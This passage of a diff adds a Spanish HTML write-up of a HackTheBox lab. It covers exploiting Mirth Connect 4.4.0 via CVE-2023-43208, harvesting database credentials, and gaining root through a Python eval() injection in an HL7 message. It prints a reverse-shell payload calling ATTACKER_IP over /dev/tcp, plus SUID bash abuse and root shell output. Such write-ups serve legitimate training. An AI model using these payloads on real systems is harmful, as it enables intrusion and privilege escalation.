+# Verificar:
+ls -la /bin/bash
+# -rwsr-xr-x 1 root root ... /bin/bash  ← SUID bit activado</pre>
+      <p><strong>Alternativa — Reverse shell directa:</strong></p>
+      <pre># Payload de reverse shell:
+HL7_PAYLOAD="MSH|^~\\&|||||||||'+__import__('os').system('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1\"')+'"
+
+echo "$HL7_PAYLOAD" | sudo /usr/bin/python3 /opt/scripts/notif.py</pre>
+      <pre># Shell como root:
+bash -p
+bash-5.1# id
+uid=1000(mirth) gid=1000(mirth) euid=0(root) groups=1000(mirth)
+
+bash-5.1# cat /root/root.txt
+[root flag]</pre>
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Flags</h2></div>
+      <div class="flags-grid">
+        <div class="flag-card">
+          <div class="flag-label">User Flag</div>
+          <div class="flag-value">Obtenida como mirth vía CVE-2023-43208</div>
+        </div>
+        <div class="flag-card">
+          <div class="flag-label">Root Flag</div>
+          <div class="flag-value">Obtenida vía Python eval() injection</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Timeline del Ataque</h2></div>
+      <div class="timeline">
+        <div class="t-item"><div class="t-dot"><span>1</span></div><div class="t-content"><div class="t-title">Nmap — Mirth Connect 4.4.0 identificado</div><div class="t-desc">Puertos 22, 80, 443 y 6661 abiertos. Mirth Connect 4.4.0 detectado en HTTPS. Versión confirmada vulnerable a CVE-2023-43208.</div></div></div>
+        <div class="t-item"><div class="t-dot"><span>2</span></div><div class="t-content"><div class="t-title">CVE-2023-43208 — XStream deserialization RCE</div><div class="t-desc">Payload XStream malicioso enviado al endpoint /api/messages sin autenticación. Deserialización instantancia clase ProcessBuilder ejecutando comando arbitrario. Shell obtenida como usuario mirth.</div></div></div>
+        <div class="t-item"><div class="t-dot"><span>3</span></div><div class="t-content"><div class="t-title">mirth.properties — Credenciales MySQL</div><div class="t-desc">Archivo de configuración de Mirth Connect expone credenciales de base de datos: mirthdb:MirthPass123!. Acceso a MySQL local obtenido.</div></div></div>
+        <div class="t-item"><div class="t-dot"><span>4</span></div><div class="t-content"><div class="t-title">MySQL — Enumeración de base de datos</div><div class="t-desc">Base de datos mirthdb analizada. Tabla NOTIFICATION_CONFIG revela script /opt/scripts/notif.py ejecutado por un canal HL7 con privilegios de root.</div></div></div>
+        <div class="t-item"><div class="t-dot"><span>5</span></div><div class="t-content"><div class="t-title">Análisis de notif.py — eval() inseguro</div><div class="t-desc">Script Python usa eval() sobre el campo MSH.9 de mensajes HL7 sin sanitización. sudo configurado para ejecutar el script como root sin contraseña.</div></div></div>
+        <div class="t-item"><div class="t-dot"><span>6</span></div><div class="t-content"><div class="t-title">HL7 eval() injection → root</div><div class="t-desc">Mensaje HL7 malicioso construido con payload Python en campo MSH.9. Ejecución vía sudo activa SUID en /bin/bash. Shell root obtenida.</div></div></div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>MITRE ATT&CK</h2></div>
+      <div class="mitre-grid">
+        <span class="mitre-tag"><span>T1190</span>Exploit Public-Facing Application</span>
+        <span class="mitre-tag"><span>T1059.006</span>Python Execution</span>
+        <span class="mitre-tag"><span>T1552.001</span>Credentials in Config Files</span>
+        <span class="mitre-tag"><span>T1078</span>Valid Accounts (MySQL)</span>
+        <span class="mitre-tag"><span>T1548.003</span>Sudo and Sudo Caching</span>
+        <span class="mitre-tag"><span>T1548.001</span>SUID Setuid Abuse</span>
+        <span class="mitre-tag"><span>T1574</span>Hijack Execution Flow</span>
+        <span class="mitre-tag"><span>T1505.003</span>Web Shell (API exploit)</span>
+        <span class="mitre-tag"><span>T1083</span>File and Directory Discovery</span>
+        <span class="mitre-tag"><span>T1082</span>System Information Discovery</span>
+      </div>
+    </div>
+
+  </div>
+  <div class="sidebar">
+    <div class="sidebar-card">
+      <h3>Detalles del Reto</h3>
+      <div class="detail-row"><span class="d-label">Plataforma</span><span class="d-value green">HackTheBox</span></div>
+      <div class="detail-row"><span class="d-label">Dificultad</span><span class="d-value red">Hard</span></div>
+      <div class="detail-row"><span class="d-label">Sistema</span><span class="d-value">Linux</span></div>
+      <div class="detail-row"><span class="d-label">Software</span><span class="d-value">Mirth Connect 4.4.0</span></div>
+      <div class="detail-row"><span class="d-label">IP</span><span class="d-value">10.129.6.249</span></div>
+      <div class="detail-row"><span class="d-label">CVE Principal</span><span class="d-value red">CVE-2023-43208</span></div>
+      <div class="detail-row"><span class="d-label">Estado</span><span class="d-value green">✓ Pwned</span></div>
+    </div>
+    <div class="sidebar-card">
+      <h3>Skills Demostradas</h3>
+      <div class="skill-item">
+        <div class="skill-header"><span class="skill-name">CVE-2023-43208 XStream RCE</span><span class="skill-pct">95%</span></div>
+        <div class="skill-bar"><div class="skill-fill" style="width:95%"></div></div>
+      </div>
+      <div class="skill-item">
+        <div class="skill-header"><span class="skill-name">Java Deserialization</span><span class="skill-pct">90%</span></div>
+        <div class="skill-bar"><div class="skill-fill" style="width:90%"></div></div>
+      </div>
+      <div class="skill-item">
+        <div class="skill-header"><span class="skill-name">Config File Credential Hunting</span><span class="skill-pct">88%</span></div>
+        <div class="skill-bar"><div class="skill-fill" style="width:88%"></div></div>
+      </div>
+      <div class="skill-item">
+        <div class="skill-header"><span class="skill-name">Python Code Injection (eval)</span><span class="skill-pct">93%</span></div>
+        <div class="skill-bar"><div class="skill-fill" style="width:93%"></div></div>
+      </div>
+      <div class="skill-item">
+        <div class="skill-header"><span class="skill-name">HL7 Protocol Analysis</span><span class="skill-pct">85%</span></div>
+        <div class="skill-bar"><div class="skill-fill" style="width:85%"></div></div>
+      </div>
+      <div class="skill-item">
+        <div class="skill-header"><span class="skill-name">Linux PrivEsc (sudo/SUID)</span><span class="skill-pct">91%</span></div>
+        <div class="skill-bar"><div class="skill-fill" style="width:91%"></div></div>
+      </div>
+    </div>
+    <div class="sidebar-card">
+      <h3>Herramientas Utilizadas</h3>
+      <div class="tool-list">
+        <div class="tool-item">nmap</div>
+        <div class="tool-item">CVE-2023-43208 exploit</div>
+        <div class="tool-item">curl</div>
+        <div class="tool-item">mysql client</div>
+        <div class="tool-item">nc (netcat)</div>
+        <div class="tool-item">Burp Suite</div>
+        <div class="tool-item">python3</div>
+        <div class="tool-item">LinPEAS</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+</body>
+</html>
